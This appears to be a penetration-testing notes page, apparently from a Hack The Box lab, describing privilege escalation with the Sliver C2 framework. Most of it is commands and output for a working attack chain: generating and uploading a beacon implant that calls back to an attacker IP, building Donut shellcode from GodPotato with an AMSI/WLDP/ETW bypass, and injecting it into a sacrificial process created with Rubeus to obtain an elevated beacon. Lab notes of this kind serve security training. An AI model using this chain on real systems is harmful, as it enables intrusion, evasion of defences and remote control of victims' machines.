---
description: Aliases and Extensions
---

# Privilege Escalation

Within Sliver you can run programs like

* `seatbelt -- -group=all`
* `sharpup -- audit`

The `execute-assembly` command can be used as well for executing .NET binaries that we have compiled.

* `execute-assembly /home/Seatbelt.exe -group=system`
* `execute-assembly /home//GodPotato-NET4.exe -cmd "whoami"`

## <mark style="color:yellow;">Donut</mark>

Donut creates binary shellcodes that can be executed in memory. So we can use this to generate a shellcode of a .NET binary and run it with `execute-shellcode`.

1. We would need to create either an `http` or `mtls` beacon(s) beforehand.

```sh
sliver (HIGH_RISER) > generate beacon --http 10.10.14.62:9002 --skip-symbols -N http-beacon

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac590/http-beacon.exe
```

2. Upload the beacon to the target. The shellcode from Donut will look for the binary in the payload argument for the tool. Place it in c:\Windows\Tasks or Temp.

```sh
sliver (HIGH_RISER) > upload http-beacon.exe
[*] Wrote file to c:\temp\http-beacon.exe
```

3. Start an `HTTP` listener that will listen on port 9002 in Sliver.

```sh
sliver (HIGH_RISER) > http --lhost 10.10.14.62 --lport 9002

[*] Starting HTTP :9002 listener ...
[*] Successfully started job #5
```

4. Create binary shellcode using:\
   `-i` for executing in memory\
   `-a 2` is amd64\
   `-b 2` is AMSI/WLDP/ETW bypass\
   `-p` binary arguments\
   `-o` output directory and name shellcode

```sh
./donut -i /home/kali/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/kali/godpotato.bin
```

5. Create a sacrificial process using Rubeus.

```sh
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```

6. With sacrifical process running use execute shellcode with the PID from Rubeus and the payload.bin.

```sh
sliver (HIGH_RISER) > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin

[*] Executed shellcode on target
sliver (HIGH_RISER) > ps -e notepad

 Pid    Ppid   Owner                        Arch     Executable    Session 
====== ====== ============================ ======== ============= =========
 5668   5884   IIS APPPOOL\DefaultAppPool   x86_64   notepad.exe   0  
 
# Use beacon
use 46d
```

